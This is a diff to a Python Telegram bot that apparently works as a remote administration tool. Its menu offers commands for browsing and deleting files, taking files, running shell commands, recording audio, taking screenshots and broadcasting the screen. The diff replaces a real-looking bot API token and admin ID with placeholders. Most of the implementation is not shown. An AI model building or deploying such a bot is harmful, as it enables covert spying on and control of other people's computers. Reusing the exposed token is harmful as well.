@@ -6,23 +6,18 @@ import pyaudio
 import wave
 import os
 
-API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
-ADMIN = 804011643
+API_TOKEN = "<token>"
+ADMIN = <id>
 
 bot = TeleBot(API_TOKEN)
 
 markup = ReplyKeyboardMarkup(True, True)
-markup.add(KeyboardButton("cd"),
-           KeyboardButton("cd_path"),
-           KeyboardButton("dir"),
-           KeyboardButton("del"),
-           KeyboardButton("type"),
-           KeyboardButton("get_file"),
-           KeyboardButton("exec_cmd_sub"),
-           KeyboardButton("record"),
-           KeyboardButton("screenshot"),
-           KeyboardButton("screen_broadcast"))
-           
+markup.add(KeyboardButton("cd"),           KeyboardButton("cd_path"),
+           KeyboardButton("dir"),          KeyboardButton("del"),
+           KeyboardButton("type"),         KeyboardButton("get_file"),
+           KeyboardButton("exec_cmd_sub"), KeyboardButton("record"),
+           KeyboardButton("screenshot"),   KeyboardButton("screen_broadcast"))
+
 
 def screen_broadcast(ms):
     bot.send_message(ADMIN, "Enter...")
@@ -294,7 +289,6 @@ def CheckCommand(ms):
 
         elif ms.text == "screen_broadcast":
             screen_broadcast(ms)
-
 
 
 bot.infinity_polling()
